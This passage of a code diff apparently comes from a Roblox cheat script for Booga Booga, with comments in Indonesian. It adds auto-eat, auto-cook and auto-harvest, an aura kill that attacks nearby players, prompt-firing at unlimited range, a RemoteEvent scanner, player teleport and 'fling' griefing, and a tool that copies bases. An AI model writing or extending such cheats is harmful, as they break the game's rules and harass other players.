             local prevTool = char:FindFirstChildOfClass("Tool")
+            
             if useEvent then
+                -- Common food & drink names in Booga Booga based on spy logs
                 local consumeList = {
-                    "Cooked Meat", "Raw Meat", "Sun Fruit", "Blood Fruit", "Blue Fruit",
+                    "Cooked Meat", "Raw Meat", "Sun Fruit", "Blood Fruit", "Blue Fruit", 
                     "Jelly", "Leaves", "Ice", "Coconut", "Cooked Fish", "Fish", "Water"
                 }
                 for _, item in ipairs(consumeList) do
@@ -804,6 +931,7 @@ local function autoEatLoop()
                     end)
                 end
             else
+                -- Fallback untuk game lain: Cek Backpack
                 local bp = LocalPlayer:FindFirstChild("Backpack")
                 if bp then
                     for _, tool in ipairs(bp:GetChildren()) do
@@ -822,12 +950,14 @@ local function autoEatLoop()
                     end
                 end
             end
+            
             if prevTool and prevTool.Parent ~= char then
                 pcall(function() hum:EquipTool(prevTool) end)
             end
         end
     end
 end
+
 spawn(function()
     while true do
         wait(1)
@@ -839,6 +969,18 @@ spawn(function()
         end
     end
 end)
+
+local cachedWorkspaceDescendants = {}
+local lastWorkspaceCache = 0
+
+local function getWorkspaceCache()
+    if tick() - lastWorkspaceCache > 2 then
+        cachedWorkspaceDescendants = workspace:GetDescendants()
+        lastWorkspaceCache = tick()
+    end
+    return cachedWorkspaceDescendants
+end
+
 local autoCookThread = nil
 local function autoCookLoop()
     while State.AutoCook do
@@ -846,27 +988,11 @@ local function autoCookLoop()
         local char = LocalPlayer.Character
         local root = char and char:FindFirstChild("HumanoidRootPart")
         if root then
-            local parts = {}
-            pcall(function()
-                local p = OverlapParams.new()
-                p.MaxParts = 1000
-                parts = workspace:GetPartBoundsInRadius(root.Position, State.AuraRadius, p)
-            end)
-            if #parts == 0 then
-                for _, d in ipairs(workspace:GetDescendants()) do
-                    local bp = d:IsA("BasePart") and d or nil
-                    if bp and (bp.Position - root.Position).Magnitude <= State.AuraRadius then
-                        table.insert(parts, bp)
-                    end
-                end
-            end
-            local processed = {}
-            for _, part in ipairs(parts) do
-                local obj = part:FindFirstAncestorOfClass("Model") or part
-                if not processed[obj] then
-                    processed[obj] = true
-                    for _, prompt in ipairs(obj:GetDescendants()) do
-                        if prompt:IsA("ProximityPrompt") then
+            for _, prompt in ipairs(getWorkspaceCache()) do
+                if prompt:IsA("ProximityPrompt") then
+                    local part = prompt:FindFirstAncestorOfClass("BasePart")
+                    if part then
+                        if (part.Position - root.Position).Magnitude <= State.AuraRadius then
                             local txt = (prompt.ActionText .. " " .. prompt.ObjectText):lower()
                             if (string.find(txt, "cook") or string.find(txt, "grill") or string.find(txt, "roast")) and not string.find(txt, "cooked") and not string.find(txt, "take") and not string.find(txt, "pick") and not string.find(txt, "grab") then
                                 pcall(function()
@@ -874,13 +1000,15 @@ local function autoCookLoop()
                                     local oldLOS = prompt.RequiresLineOfSight
                                     prompt.MaxActivationDistance = math.huge
                                     prompt.RequiresLineOfSight = false
+                                    
                                     if fireproximityprompt then
-                                        fireproximityprompt(prompt)
+                                        fireproximityprompt(prompt, 1, true)
                                     else
                                         prompt:InputHoldBegin()
                                         task.wait(prompt.HoldDuration + 0.05)
                                         prompt:InputHoldEnd()
                                     end
+                                    
                                     prompt.MaxActivationDistance = oldDist
                                     prompt.RequiresLineOfSight = oldLOS
                                 end)
@@ -892,6 +1020,7 @@ local function autoCookLoop()
         end
     end
 end
+
 spawn(function()
     while true do
         wait(1)
@@ -903,7 +1032,9 @@ spawn(function()
         end
     end
 end)
+
 local scanRemoteBtn = Instance.new("TextButton")
+
 local auraHarvestThread = nil
 local function auraHarvestLoop()
     local cachedPickupEvent
@@ -913,32 +1044,18 @@ local function auraHarvestLoop()
             break
         end
     end
+
     while State.AuraHarvest do
         wait(State.AttackCooldown > 0 and State.AttackCooldown or 0.1)
         local char = LocalPlayer.Character
         local root = char and char:FindFirstChild("HumanoidRootPart")
         if root then
-            local parts = {}
-            pcall(function()
-                local p = OverlapParams.new()
-                p.MaxParts = 1000
-                parts = workspace:GetPartBoundsInRadius(root.Position, State.AuraRadius, p)
-            end)
-            if #parts == 0 then
-                for _, d in ipairs(workspace:GetDescendants()) do
-                    local bp = d:IsA("BasePart") and d or nil
-                    if bp and (bp.Position - root.Position).Magnitude <= State.AuraRadius then
-                        table.insert(parts, bp)
-                    end
-                end
-            end
-            local processed = {}
-            for _, part in ipairs(parts) do
-                local obj = part:FindFirstAncestorOfClass("Model") or part
-                if not processed[obj] then
-                    processed[obj] = true
-                    local prompt = obj:FindFirstDescendant("ProximityPrompt")
-                    if prompt then
+            for _, obj in ipairs(getWorkspaceCache()) do
+                if obj:IsA("Model") or obj:IsA("BasePart") then
+                    local primary = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChildOfClass("BasePart")) or obj
+                    if primary and (primary.Position - root.Position).Magnitude <= State.AuraRadius then
+                        local prompt = obj:FindFirstChildOfClass("ProximityPrompt", true)
+                        if prompt then
                             local txt = (prompt.ActionText .. " " .. prompt.ObjectText):lower()
                             if string.find(txt, "take") or string.find(txt, "pick") or string.find(txt, "harvest") or string.find(txt, "gather") or string.find(txt, "grab") then
                                 pcall(function()
@@ -946,13 +1063,15 @@ local function auraHarvestLoop()
                                     local oldLOS = prompt.RequiresLineOfSight
                                     prompt.MaxActivationDistance = math.huge
                                     prompt.RequiresLineOfSight = false
+                                    
                                     if fireproximityprompt then
-                                        fireproximityprompt(prompt)
+                                        fireproximityprompt(prompt, 1, true)
                                     else
                                         prompt:InputHoldBegin()
                                         task.wait(prompt.HoldDuration + 0.05)
                                         prompt:InputHoldEnd()
                                     end
+                                    
                                     prompt.MaxActivationDistance = oldDist
                                     prompt.RequiresLineOfSight = oldLOS
                                 end)
@@ -970,6 +1089,7 @@ local function auraHarvestLoop()
         end
     end
 end
+
 spawn(function()
     while true do
         wait(1)
@@ -981,6 +1101,7 @@ spawn(function()
         end
     end
 end)
+
 local auraKillThread = nil
 local function auraKillLoop()
     while State.AuraKill do
@@ -990,6 +1111,8 @@ local function auraKillLoop()
         if root then
             local targetType = nil
             local shouldAttack = false
+            
+            -- 1. Cek Pemain / Musuh
             for _, p in ipairs(Players:GetPlayers()) do
                 if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
                     local eRoot = p.Character.HumanoidRootPart
@@ -1000,27 +1123,14 @@ local function auraKillLoop()
                     end
                 end
             end
+            
+            -- 2. Cek Pohon / Batu / Resource (kalau gak ada musuh)
             if not shouldAttack then
-                local parts = {}
-                pcall(function()
-                    local p = OverlapParams.new()
-                    p.MaxParts = 500
-                    parts = workspace:GetPartBoundsInRadius(root.Position, State.AuraRadius, p)
-                end)
-                if #parts == 0 then
-                    for _, d in ipairs(workspace:GetDescendants()) do
-                        local bp = d:IsA("BasePart") and d or nil
-                        if bp and (bp.Position - root.Position).Magnitude <= State.AuraRadius then
-                            table.insert(parts, bp)
-                        end
-                    end
-                end
-                local processed = {}
-                for _, part in ipairs(parts) do
-                    local obj = part:FindFirstAncestorOfClass("Model") or part
-                    if not processed[obj] and obj:IsA("Model") and (obj:FindFirstChild("Durability") or obj:FindFirstChild("Health") or obj:FindFirstChild("Resource") or obj:FindFirstChild("Toughness")) then
-                        processed[obj] = true
-                        local n = obj.Name:lower()
+                for _, obj in ipairs(getWorkspaceCache()) do
+                    if obj:IsA("Model") and (obj:FindFirstChild("Durability") or obj:FindFirstChild("Health") or obj:FindFirstChild("Resource") or obj:FindFirstChild("Toughness")) then
+                        local primary = obj.PrimaryPart or obj:FindFirstChildOfClass("BasePart")
+                        if primary and (primary.Position - root.Position).Magnitude <= State.AuraRadius then
+                            local n = obj.Name:lower()
                             if string.find(n, "rock") or string.find(n, "iron") or string.find(n, "gold") or string.find(n, "ore") or string.find(n, "stone") or string.find(n, "meteor") or string.find(n, "adaman") then
                                 targetType = "Rock"
                             elseif string.find(n, "tree") or string.find(n, "log") or string.find(n, "wood") or string.find(n, "bush") or string.find(n, "plant") then
@@ -1034,11 +1144,13 @@ local function auraKillLoop()
                     end
                 end
             end
+            
             if shouldAttack then
                 local bp = LocalPlayer:FindFirstChild("Backpack")
                 local allTools = {}
                 for _, t in ipairs(char:GetChildren()) do if t:IsA("Tool") then table.insert(allTools, t) end end
                 if bp then for _, t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then table.insert(allTools, t) end end end
+                
                 local bestTool = nil
                 if targetType == "Rock" then
                     for _, t in ipairs(allTools) do
@@ -1055,14 +1167,18 @@ local function auraKillLoop()
                         end
                     end
                 end
+                
+                -- Default kalau gak nemu senjata spesifik
                 if not bestTool then
                     bestTool = char:FindFirstChildOfClass("Tool") or allTools[1]
                 end
+                
                 if bestTool then
                     if bestTool.Parent ~= char then
                         pcall(function() char.Humanoid:EquipTool(bestTool) end)
-                        wait(0.1)
+                        wait(0.1) -- Jeda kecil biar senjatanya terpegang dulu di server
                     end
+                    
                     local attackEvent = bestTool:FindFirstChild("AttackEvent") or bestTool:FindFirstChild("ClientControl")
                     pcall(function()
                         if attackEvent then
@@ -1079,6 +1195,7 @@ local function auraKillLoop()
         end
     end
 end
+
 spawn(function()
     while true do
         wait(1)
@@ -1090,8 +1207,9 @@ spawn(function()
         end
     end
 end)
+
 scanRemoteBtn.Size = UDim2.new(0.9, 0, 0, 30)
-scanRemoteBtn.Position = UDim2.new(0.05, 0, 0, 0)
+scanRemoteBtn.Position = UDim2.new(0.05, 0, 0, 0) -- Akan dikendalikan oleh UIListLayout
 scanRemoteBtn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
 scanRemoteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 scanRemoteBtn.Font = Enum.Font.GothamBold
@@ -1099,6 +1217,7 @@ scanRemoteBtn.TextSize = 13
 scanRemoteBtn.Text = "Scan RemoteEvents (See Log)"
 scanRemoteBtn.LayoutOrder = 3
 scanRemoteBtn.Parent = teleportTab
+
 scanRemoteBtn.MouseButton1Click:Connect(function()
     logAction("SCAN", "Scanning all RemoteEvents in game...")
     local count = 0
@@ -1111,19 +1230,26 @@ scanRemoteBtn.MouseButton1Click:Connect(function()
             pcall(function() scan(v) end)
         end
     end
+    
     pcall(function() scan(game:GetService("ReplicatedStorage")) end)
     pcall(function() scan(game:GetService("Workspace")) end)
     pcall(function() scan(game:GetService("Players")) end)
+    
     logAction("SCAN", "Total " .. count .. " RemoteEvents found!")
 end)
+
+-- Touch Fling Feature
 local touchFlingThread = nil
+
 local function touchFlingLoop()
     local lp = Players.LocalPlayer
     local movel = 0.1
+    
     while State.TouchFling do
         RunService.Heartbeat:Wait()
         local c = lp.Character
         local hrp = c and c:FindFirstChild("HumanoidRootPart")
+        
         if hrp then
             local vel = hrp.Velocity
             hrp.Velocity = vel * 500000 + Vector3.new(0, 500000, 0)
@@ -1135,7 +1261,9 @@ local function touchFlingLoop()
         end
     end
 end
+
 createToggle("TouchFling", "Touch Fling (Vibrate)", "TouchFling", 2, teleportTab)
+
 spawn(function()
     while true do
         wait(0.5)
@@ -1147,18 +1275,22 @@ spawn(function()
         end
     end
 end)
+
 RunService.RenderStepped:Connect(function()
     if State.NightMode then
-        Lighting.ClockTime = 0
+        Lighting.ClockTime = 0 -- Tengah malam secara instan tiap frame (anti-blink)
         Lighting.Brightness = State.NightBrightness
         Lighting.GlobalShadows = false
     end
 end)
+
+-- TELEPORT TAB
 local tpContainer = Instance.new("Frame")
 tpContainer.Size = UDim2.new(0.9, 0, 0, 105)
 tpContainer.BackgroundTransparency = 1
 tpContainer.LayoutOrder = 1
 tpContainer.Parent = teleportTab
+
 local refreshBtn = Instance.new("TextButton")
 refreshBtn.Size = UDim2.new(0.48, 0, 0, 30)
 refreshBtn.Position = UDim2.new(0, 0, 0, 0)
@@ -1168,6 +1300,7 @@ refreshBtn.Font = Enum.Font.GothamBold
 refreshBtn.TextSize = 12
 refreshBtn.Text = "Refresh List"
 refreshBtn.Parent = tpContainer
+
 local tpBtn = Instance.new("TextButton")
 tpBtn.Size = UDim2.new(0.48, 0, 0, 30)
 tpBtn.Position = UDim2.new(0.52, 0, 0, 0)
@@ -1177,6 +1310,7 @@ tpBtn.Font = Enum.Font.GothamBold
 tpBtn.TextSize = 12
 tpBtn.Text = "TP To Player"
 tpBtn.Parent = tpContainer
+
 local bringBtn = Instance.new("TextButton")
 bringBtn.Size = UDim2.new(0.48, 0, 0, 30)
 bringBtn.Position = UDim2.new(0, 0, 0, 35)
@@ -1186,6 +1320,7 @@ bringBtn.Font = Enum.Font.GothamBold
 bringBtn.TextSize = 12
 bringBtn.Text = "TP Behind Player"
 bringBtn.Parent = tpContainer
+
 local flingPlayerBtn = Instance.new("TextButton")
 flingPlayerBtn.Size = UDim2.new(0.48, 0, 0, 30)
 flingPlayerBtn.Position = UDim2.new(0.52, 0, 0, 35)
@@ -1195,6 +1330,7 @@ flingPlayerBtn.Font = Enum.Font.GothamBold
 flingPlayerBtn.TextSize = 12
 flingPlayerBtn.Text = "Fling Player"
 flingPlayerBtn.Parent = tpContainer
+
 local playerDropdown = Instance.new("TextButton")
 playerDropdown.Size = UDim2.new(1, 0, 0, 30)
 playerDropdown.Position = UDim2.new(0, 0, 0, 70)
@@ -1204,6 +1340,7 @@ playerDropdown.Font = Enum.Font.Gotham
 playerDropdown.TextSize = 12
 playerDropdown.Text = "Select Player..."
 playerDropdown.Parent = tpContainer
+
 local playerList = Instance.new("ScrollingFrame")
 playerList.Size = UDim2.new(1, 0, 0, 200)
 playerList.Position = UDim2.new(0, 0, 0, 68)
@@ -1212,16 +1349,20 @@ playerList.ScrollBarThickness = 4
 playerList.Visible = false
 playerList.ZIndex = 10
 playerList.Parent = tpContainer
+
 local listLayoutTP = Instance.new("UIListLayout")
 listLayoutTP.Parent = playerList
 listLayoutTP.SortOrder = Enum.SortOrder.Name
+
 local selectedPlayer = nil
+
 local function updatePlayerList()
     for _, child in ipairs(playerList:GetChildren()) do
         if child:IsA("TextButton") then
             child:Destroy()
         end
     end
+    
     local ySize = 0
     for _, player in ipairs(Players:GetPlayers()) do
         if player ~= LocalPlayer then
@@ -1235,6 +1376,7 @@ local function updatePlayerList()
             btn.Name = player.Name
             btn.ZIndex = 11
             btn.Parent = playerList
+            
             btn.MouseButton1Click:Connect(function()
                 selectedPlayer = player.Name
                 State.SelectedPlayer = player.Name
@@ -1247,6 +1389,7 @@ local function updatePlayerList()
     end
     playerList.CanvasSize = UDim2.new(0, 0, 0, ySize)
 end
+
 refreshBtn.MouseButton1Click:Connect(function()
     updatePlayerList()
     playerDropdown.Text = "Pilih Pemain..."
@@ -1255,6 +1398,7 @@ refreshBtn.MouseButton1Click:Connect(function()
         tpContainer.Size = UDim2.new(0.9, 0, 0, 305)
     end
 end)
+
 playerDropdown.MouseButton1Click:Connect(function()
     playerList.Visible = not playerList.Visible
     if playerList.Visible then
@@ -1264,77 +1408,106 @@ playerDropdown.MouseButton1Click:Connect(function()
         tpContainer.Size = UDim2.new(0.9, 0, 0, 105)
     end
 end)
+
 local function checkTeleportRequirements()
     if not selectedPlayer then
         logAction("TELEPORT", "Failed: You haven't selected a player from the list!")
         return false
     end
+    
     local targetName = type(selectedPlayer) == "string" and selectedPlayer or selectedPlayer.Name
     local targetPlayer = Players:FindFirstChild(targetName)
+    
     if not targetPlayer then
         logAction("TELEPORT", "Failed: Player " .. targetName .. " not found in server!")
         return false
     end
+
     local targetChar = targetPlayer.Character
     if not targetChar or not targetChar:GetPivot() then
         logAction("TELEPORT", "Failed: Player " .. targetName .. " has not spawned or is dead!")
         return false
     end
+    
     local myChar = LocalPlayer.Character
     if not myChar or not myChar:GetPivot() then
         logAction("TELEPORT", "Failed: Your character has not spawned or is dead!")
         return false
     end
+    
     return true, myChar, targetChar, targetName
 end
+
 tpBtn.MouseButton1Click:Connect(function()
     local success, char, targetChar, targetName = checkTeleportRequirements()
     if success then
         local hum = char:FindFirstChildOfClass("Humanoid")
-        if hum then hum.Sit = false end
+        if hum then hum.Sit = false end -- Lepaskan dari kursi jika sedang duduk
+        
+        -- Gunakan PivotTo agar seluruh model karakter ikut berpindah tanpa terputus
         local targetCFrame = targetChar:GetPivot()
         char:PivotTo(targetCFrame * CFrame.new(0, 2, -3) * CFrame.Angles(0, math.pi, 0))
+        
         local root = char.PrimaryPart or char:FindFirstChild("HumanoidRootPart")
         if root then
+            -- Fix Kamera "Lemot/Lag"
             local cam = workspace.CurrentCamera
             if cam then
                 cam.CFrame = CFrame.lookAt(root.Position + (root.CFrame.LookVector * -12) + Vector3.new(0, 5, 0), root.Position)
             end
         end
-        if hum then hum:ChangeState(Enum.HumanoidStateType.Freefall) end
+        
+        if hum then hum:ChangeState(Enum.HumanoidStateType.Freefall) end -- Force physics update
+        
         logAction("TELEPORT", "Successfully INSTANT teleported to " .. targetName)
     end
 end)
+
 bringBtn.MouseButton1Click:Connect(function()
     local success, char, targetChar, targetName = checkTeleportRequirements()
     if success then
         pcall(function()
             local hum = char:FindFirstChildOfClass("Humanoid")
             if hum then hum.Sit = false end
+            
+            -- Teleport kita ke punggung/belakang musuh, dengan offset Y (+2) menghindari tanah
             local targetCFrame = targetChar:GetPivot()
             char:PivotTo(targetCFrame * CFrame.new(0, 2, 4))
+            
             if hum then hum:ChangeState(Enum.HumanoidStateType.Freefall) end
+            
             logAction("TELEPORT", "Successfully teleported behind " .. targetName)
         end)
     end
 end)
+
 flingPlayerBtn.MouseButton1Click:Connect(function()
     local success, char, targetChar, targetName = checkTeleportRequirements()
     if success then
         logAction("FLING", "Teleporting into " .. targetName .. " and activating Touch Fling!")
+        
+        -- Teleport kita tepat ke dalam musuh menggunakan PivotTo
         local targetCFrame = targetChar:GetPivot()
         char:PivotTo(targetCFrame)
+        
+        -- Aktifkan state Touch Fling agar kita langsung bergetar dan melempar target
         State.TouchFling = true
+        
+        -- Pastikan thread Touch Fling langsung berjalan jika sebelumnya mati
         if not touchFlingThread or coroutine.status(touchFlingThread) == "dead" then
             touchFlingThread = coroutine.create(touchFlingLoop)
             coroutine.resume(touchFlingThread)
         end
+        
         logAction("FLING", "Now inside " .. targetName .. ". Move slightly to fling them away!")
     end
 end)
+
+-- BUILDER TAB
 local SavedBase = {}
 local BaseDatabase = {}
 local selectedBaseName = nil
+
 local function loadBaseDatabase()
     if readfile and isfile and HttpService then
         if isfile("PandaBooga_BasesDB.json") then
@@ -1360,6 +1533,7 @@ local function loadBaseDatabase()
     end
     return false
 end
+
 local function saveBaseDatabase()
     if writefile and HttpService then
         local serializedDB = {}
@@ -1383,7 +1557,9 @@ local function saveBaseDatabase()
         end)
     end
 end
+
 loadBaseDatabase()
+
 local builderRadiusInput = Instance.new("TextBox")
 builderRadiusInput.Size = UDim2.new(0.9, 0, 0, 30)
 builderRadiusInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
@@ -1394,6 +1570,7 @@ builderRadiusInput.Text = tostring(State.CopyRadius)
 builderRadiusInput.PlaceholderText = "Radius (Studs)"
 builderRadiusInput.LayoutOrder = 1
 builderRadiusInput.Parent = builderTab
+
 local copyBaseBtn = Instance.new("TextButton")
 copyBaseBtn.Size = UDim2.new(0.9, 0, 0, 35)
 copyBaseBtn.BackgroundColor3 = Color3.fromRGB(52, 152, 219)
@@ -1403,6 +1580,7 @@ copyBaseBtn.TextSize = 13
 copyBaseBtn.Text = "Copy Base (Radius " .. State.CopyRadius .. ")"
 copyBaseBtn.LayoutOrder = 2
 copyBaseBtn.Parent = builderTab
+
 local deleteRadiusInput = Instance.new("TextBox")
 deleteRadiusInput.Size = UDim2.new(0.9, 0, 0, 30)
 deleteRadiusInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
@@ -1413,6 +1591,7 @@ deleteRadiusInput.Text = tostring(State.DeleteRadius)
 deleteRadiusInput.PlaceholderText = "Delete Radius (Studs)"
 deleteRadiusInput.LayoutOrder = 12
 deleteRadiusInput.Parent = builderTab
+
 local deleteRadiusBtn = Instance.new("TextButton")
 deleteRadiusBtn.Size = UDim2.new(0.9, 0, 0, 35)
 deleteRadiusBtn.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
@@ -1422,6 +1601,7 @@ deleteRadiusBtn.TextSize = 13
 deleteRadiusBtn.Text = "Delete in Area (Radius " .. State.DeleteRadius .. ")"
 deleteRadiusBtn.LayoutOrder = 13
 deleteRadiusBtn.Parent = builderTab
+
 builderRadiusInput.FocusLost:Connect(function()
     local num = tonumber(builderRadiusInput.Text)
     if num then
@@ -1434,6 +1614,7 @@ builderRadiusInput.FocusLost:Connect(function()
         builderRadiusInput.Text = tostring(State.CopyRadius)
     end
 end)
+
 deleteRadiusInput.FocusLost:Connect(function()
     local num = tonumber(deleteRadiusInput.Text)
     if num then
@@ -1446,6 +1627,7 @@ deleteRadiusInput.FocusLost:Connect(function()
         deleteRadiusInput.Text = tostring(State.DeleteRadius)
     end
 end)
+
 local buildStatusLabel = Instance.new("TextLabel")
 buildStatusLabel.Size = UDim2.new(0.9, 0, 0, 20)
 buildStatusLabel.BackgroundTransparency = 1
@@ -1455,6 +1637,7 @@ buildStatusLabel.TextSize = 11
 buildStatusLabel.Text = "0 Buildings Saved"
 buildStatusLabel.LayoutOrder = 3
 buildStatusLabel.Parent = builderTab
+
 local baseNameInput = Instance.new("TextBox")
 baseNameInput.Size = UDim2.new(0.9, 0, 0, 30)
 baseNameInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
@@ -1465,6 +1648,7 @@ baseNameInput.Text = ""
 baseNameInput.PlaceholderText = "Base Name (Example: my base)"
 baseNameInput.LayoutOrder = 4
 baseNameInput.Parent = builderTab
+
 local saveBaseBtn = Instance.new("TextButton")
 saveBaseBtn.Size = UDim2.new(0.9, 0, 0, 30)
 saveBaseBtn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
@@ -1474,6 +1658,7 @@ saveBaseBtn.TextSize = 12
 saveBaseBtn.Text = "Save Base to List"
 saveBaseBtn.LayoutOrder = 5
 saveBaseBtn.Parent = builderTab
+
 local loadBaseBtn = Instance.new("TextButton")
 loadBaseBtn.Size = UDim2.new(0.9, 0, 0, 30)
 loadBaseBtn.BackgroundColor3 = Color3.fromRGB(230, 126, 34)
@@ -1483,6 +1668,7 @@ loadBaseBtn.TextSize = 12
 loadBaseBtn.Text = "Sync JSON Data"
 loadBaseBtn.LayoutOrder = 6
 loadBaseBtn.Parent = builderTab
+
 local baseDropdown = Instance.new("TextButton")
 baseDropdown.Size = UDim2.new(0.9, 0, 0, 30)
 baseDropdown.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
@@ -1492,6 +1678,7 @@ baseDropdown.TextSize = 12
 baseDropdown.Text = "Select Base from List..."
 baseDropdown.LayoutOrder = 7
 baseDropdown.Parent = builderTab
+
 local baseList = Instance.new("ScrollingFrame")
 baseList.Size = UDim2.new(0.9, 0, 0, 0)
 baseList.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
@@ -1500,14 +1687,17 @@ baseList.ScrollBarThickness = 4
 baseList.Visible = false
 baseList.LayoutOrder = 8
 baseList.Parent = builderTab
+
 local baseListLayout = Instance.new("UIListLayout")
 baseListLayout.Parent = baseList
 baseListLayout.SortOrder = Enum.SortOrder.Name
+
 local pasteHeightContainer = Instance.new("Frame")
 pasteHeightContainer.Size = UDim2.new(0.9, 0, 0, 35)
 pasteHeightContainer.BackgroundTransparency = 1
 pasteHeightContainer.LayoutOrder = 9
 pasteHeightContainer.Parent = builderTab
+
 local pasteHeightLabel = Instance.new("TextLabel")
 pasteHeightLabel.Size = UDim2.new(0.55, 0, 1, 0)
 pasteHeightLabel.BackgroundTransparency = 1
@@ -1517,6 +1707,7 @@ pasteHeightLabel.Font = Enum.Font.GothamBold
 pasteHeightLabel.TextSize = 13
 pasteHeightLabel.TextXAlignment = Enum.TextXAlignment.Left
 pasteHeightLabel.Parent = pasteHeightContainer
+
 local pasteHeightInput = Instance.new("TextBox")
 pasteHeightInput.Size = UDim2.new(0.4, 0, 0.8, 0)
 pasteHeightInput.Position = UDim2.new(0.6, 0, 0.1, 0)
@@ -1527,6 +1718,7 @@ pasteHeightInput.TextSize = 13
 pasteHeightInput.Text = tostring(State.PasteHeight)
 pasteHeightInput.PlaceholderText = "Height"
 pasteHeightInput.Parent = pasteHeightContainer
+
 pasteHeightInput.FocusLost:Connect(function()
     local num = tonumber(pasteHeightInput.Text)
     if num then
@@ -1536,6 +1728,7 @@ pasteHeightInput.FocusLost:Connect(function()
         pasteHeightInput.Text = tostring(State.PasteHeight)
     end
 end)
+
 local pasteBaseBtn = Instance.new("TextButton")
 pasteBaseBtn.Size = UDim2.new(0.9, 0, 0, 35)
 pasteBaseBtn.BackgroundColor3 = Color3.fromRGB(155, 89, 182)
@@ -1545,6 +1738,7 @@ pasteBaseBtn.TextSize = 13
 pasteBaseBtn.Text = "Paste Selected Base"
 pasteBaseBtn.LayoutOrder = 10
 pasteBaseBtn.Parent = builderTab
+
 local deleteBaseBtn = Instance.new("TextButton")
 deleteBaseBtn.Size = UDim2.new(0.9, 0, 0, 35)
 deleteBaseBtn.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
@@ -1554,6 +1748,7 @@ deleteBaseBtn.TextSize = 13
 deleteBaseBtn.Text = "Delete Selected Base"
 deleteBaseBtn.LayoutOrder = 11
 deleteBaseBtn.Parent = builderTab
+
 local clearMyBuildsBtn = Instance.new("TextButton")
 clearMyBuildsBtn.Size = UDim2.new(0.9, 0, 0, 35)
 clearMyBuildsBtn.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
@@ -1563,12 +1758,14 @@ clearMyBuildsBtn.TextSize = 13
 clearMyBuildsBtn.Text = "Delete All My Buildings"
 clearMyBuildsBtn.LayoutOrder = 12
 clearMyBuildsBtn.Parent = builderTab
+
 local function updateBaseList()
     for _, child in ipairs(baseList:GetChildren()) do
         if child:IsA("TextButton") then
             child:Destroy()
         end
     end
+    
     local ySize = 0
     for bName, _ in pairs(BaseDatabase) do
         local btn = Instance.new("TextButton")
@@ -1580,12 +1777,15 @@ local function updateBaseList()
         btn.Text = bName
         btn.Name = bName
         btn.Parent = baseList
+        
         btn.MouseButton1Click:Connect(function()
             selectedBaseName = bName
             baseDropdown.Text = bName
-            baseNameInput.Text = bName
+            baseNameInput.Text = bName -- Set nama base ke textbox biar mudah diedit
             baseList.Visible = false
             baseList.Size = UDim2.new(0.9, 0, 0, 0)
+            
+            -- Set SavedBase ke base yang dipilih agar siap di-paste
             SavedBase = BaseDatabase[bName]
             buildStatusLabel.Text = #SavedBase .. " Buildings (" .. bName .. ") Ready to Paste"
         end)
@@ -1593,6 +1793,7 @@ local function updateBaseList()
     end
     baseList.CanvasSize = UDim2.new(0, 0, 0, ySize)
 end
+
 baseDropdown.MouseButton1Click:Connect(function()
     baseList.Visible = not baseList.Visible
     if baseList.Visible then
@@ -1602,34 +1803,47 @@ baseDropdown.MouseButton1Click:Connect(function()
         baseList.Size = UDim2.new(0.9, 0, 0, 0)
     end
 end)
+
 copyBaseBtn.MouseButton1Click:Connect(function()
     local char = LocalPlayer.Character
     local root = char and char:FindFirstChild("HumanoidRootPart")
     if not root then return end
+
     SavedBase = {}
+    -- Mengambil posisi murni karakter (XYZ)
     local originPos = root.Position
+
+    -- Cari bangunan di sekitar
     for _, obj in ipairs(workspace:GetDescendants()) do
         if obj:IsA("Model") then
             local isBuilding = false
+            
+            -- Indikator kuat: Jika punya Owner/Creator
             if obj:FindFirstChild("Owner") or obj:FindFirstChild("Creator") or obj:FindFirstChild("Placer") then
                 isBuilding = true
             end
+            
+            -- Filter berdasarkan kata kunci nama (Wall, Foundation, dll)
             local n = obj.Name:lower()
             if not isBuilding then
-                if (string.find(n, "wall") or string.find(n, "foundation") or string.find(n, "stairs") or
-                    string.find(n, "door") or string.find(n, "window") or string.find(n, "bed") or
-                    string.find(n, "fire") or string.find(n, "well") or string.find(n, "torch") or
+                if (string.find(n, "wall") or string.find(n, "foundation") or string.find(n, "stairs") or 
+                    string.find(n, "door") or string.find(n, "window") or string.find(n, "bed") or 
+                    string.find(n, "fire") or string.find(n, "well") or string.find(n, "torch") or 
                     string.find(n, "chest") or string.find(n, "gate") or string.find(n, "bridge")) then
+                    
+                    -- Pastikan BUKAN sumber daya alam
                     if not string.find(n, "tree") and not string.find(n, "rock") and not string.find(n, "ore") and not string.find(n, "bush") then
                         isBuilding = true
                     end
                 end
             end
+
             if isBuilding then
                 local primary = obj.PrimaryPart or obj:FindFirstChild("Hitbox") or obj:FindFirstChildOfClass("BasePart")
                 if primary then
                     local dist = (primary.Position - originPos).Magnitude
                     if dist <= State.CopyRadius then
+                        -- Simpan CFrame relatif terhadap tubuh karakter (Posisi & Rotasi)
                         local relativeCFrame = root.CFrame:ToObjectSpace(primary.CFrame)
                         table.insert(SavedBase, {
                             Name = obj.Name,
@@ -1642,9 +1856,11 @@ copyBaseBtn.MouseButton1Click:Connect(function()
             end
         end
     end
+    
     buildStatusLabel.Text = #SavedBase .. " Buildings Saved"
     logAction("BUILDER", "Successfully copied " .. #SavedBase .. " buildings!")
 end)
+
 saveBaseBtn.MouseButton1Click:Connect(function()
     if #SavedBase == 0 then
         logAction("BUILDER", "Failed: No base is currently copied!")
@@ -1655,7 +1871,11 @@ saveBaseBtn.MouseButton1Click:Connect(function()
         logAction("BUILDER", "Failed: Enter base name first! (Example: my base)")
         return
     end
+    
+    -- Load dulu dari file untuk memastikan kita punya data terbaru sebelum save (biar tidak tertimpa)
     loadBaseDatabase()
+    
+    -- Simpan base saat ini ke database internal
     BaseDatabase[bName] = {}
     for _, item in ipairs(SavedBase) do
         table.insert(BaseDatabase[bName], {
@@ -1665,10 +1885,12 @@ saveBaseBtn.MouseButton1Click:Connect(function()
